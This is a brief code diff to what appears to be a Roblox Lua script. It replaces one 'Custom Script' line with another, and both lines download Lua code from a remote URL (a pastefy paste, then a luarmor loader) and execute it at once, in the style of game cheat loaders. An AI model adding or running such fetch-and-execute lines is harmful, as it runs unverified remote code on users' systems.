@@ -11,5 +11,5 @@ end)
 
 -- Custom Script
 task.spawn(function()
-loadstring(game:HttpGet("https://pastefy.app/n1cXFHPi/raw"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/195d1071ee63fbac050300e2155f573f.lua"))()
 end)
